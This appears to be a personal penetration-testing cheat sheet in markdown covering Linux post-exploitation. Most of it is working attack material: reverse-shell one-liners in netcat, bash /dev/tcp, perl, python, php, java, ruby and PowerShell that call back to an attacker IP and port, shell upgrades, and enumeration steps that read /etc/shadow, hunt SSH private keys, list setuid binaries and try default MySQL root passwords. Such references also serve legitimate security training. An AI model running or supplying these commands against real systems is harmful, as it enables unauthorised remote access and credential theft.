## enumerate a process using directory traversal
If we have an unknown service on a port exposed, and have a directory traversal bug, then we can use /proc/sched_debug to get PID's to all the running processes, then from that we can make an educated guess so as to what service it can be, then we can use /proc/PID/cmdline to cross check more on this here https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/

## getting a reverse shell:-
### Try using netcat as follows:-
1. on your attacker machine set up a listener by:- `nc -lvp "port"`
2. on the compromised machine connect with the listener and spawn shell by:- `nc -e /bin/bash "attacking machine IP" "port"`
3. If -e flag is missing then use this `mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ip port > /tmp/f`

### If netcat doesnt work then use netcat to set up listener in the attacker machine via netcat and use the following to get a reverse shell back
`/bin/bash -i >& /dev/tcp/IP/PORT 0>&1` (via bash)<br />
or<br />
`perl -e 'use Socket;$i="IP";$p="PORT";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'` (via perl)<br />
or<br />
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'` (via python) <br />
or<br />
`php -r '$sock=fsockopen("IP",PORT);exec("/bin/bash -i <&3 >&3 2>&3");'` (via php)<br />
or<br />
`r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()` (via java)<br />
or<br />
`ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'` (via ruby)<br />
or<br />
`powershell -c "$client = New-Object System.Net.Sockets.TCPClient("IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` (via powershell)
# getting a tty shell:-
`python -c ‘import pty; pty.spawn("/bin/bash")’`<br />
or<br />
`python3 -c ‘import pty; pty.spawn("/bin/bash")’`<br />
or<br />
`python -c ‘import pty; pty.spawn("/bin/sh")’`<br />
or<br />
`python3 -c ‘import pty; pty.spawn("/bin/bash")’`<br />
or<br />
`SHELL="/bin/bash" script -q /dev/null`<br />

## getting a colored tty shell (after getting a tty shell):- 
#### *do this in your host machine because u need the length and breadth of the window of ur terminal*

`stty -a` <br />
#### *then do the following in the victim shell*<br />
`export SHELL=/bin/bash`<br />
`export TERM=xterm256-color`<br />
`stty rows "rows u found in step1" columns "columns u found in step1"`<br />

## Making the shell interactive:-

`stty raw -echo`

## the obvious stuff:-

history <br />
whoami <br />
id <br />
hostname<br />
cat /etc/passwd<br />
sudo -l (to list all perms of the user)<br />
sudo --version (to check the version and see if it is vulnerable to any exploit)<br />

## about system and processes running:-

`uname -a` (to get the version of the kernel)<br />
`cat /etc/shells 2>/dev/null` (list available shells)<br />
`ps aux 2>/dev/null`<br />
`find /etc/init.d/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null` (init.d files not belonging to root)<br />
`find /lib/systemd/ \! -uid 0 -type f 2>/dev/null |xargs -r ls -la 2>/dev/null` (systemd files not belonging to root)<br />
`mysql --version 2>/dev/null` (to check the version of mysql if installed to check for any known vulnerabilities)<br />
`mysqladmin -uroot -proot version 2>/dev/null` (to check if default creds work)<br />
`mysqladmin -uroot version 2>/dev/null` (to check if no pass works)<br />
`psql -V 2>/dev/null` (to check the version of postgresql if installed to check for any known vulnerabilities)<br />

## about services(daemons) running:-

`systemctl list-units --type=service` (to list all services active or not)
We can also check in /etc/init.d/ to check for any daemons which run after init(systemd) essentially all startup services

## about users:-

cat /etc/passwd 2>/dev/null<br />
lastlog (to get last login details of all user accounts)<br />
w (to check if any other user is currently logged on)<br />
cat /etc/group (to see if any user is part of other groups)<br />
cat /etc/shadow (if we r in the root or shadow group)<br />
cat /etc/master.passwd (same as /etc/shadow but for bsd)<br />
find /home -name .sudo_as_admin_successful 2>/dev/null (find who has sudoed earlier)<br />

## then find files owned by the user/group/root via the following:-

ls -l<br />
find / -user "username/root" -group "groupname" exec ls -lb 2>/dev/null<br />
locate "groupname"(sometimes can result in filenames having the groupname in it.....MIGHT BE INTERESTING!!)<br />

## then find files not owned by the user/group/root but have rights via the following:-

`find / -readable ! -user "user" -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null` (read rights)<br />
`find / -writable ! -user "user" -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null` (write rights)<br />
`find / -executable ! -user "user" -type f ! -path "/proc/*" ! -path "/sys/*" 2>/dev/null` (executable rights)<br />
`find / -user root -perm -4000 2>/dev/null` (for getting setuid files)<br />
`find / -user root -perm -2000 2>/dev/null` (for getting all setgid files)<br />
`find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null`  (to get ssh info)<br />

## To download something from the internet or from intranet:-

Can do a wget or curl

## To locate a file 

locate <file_name>
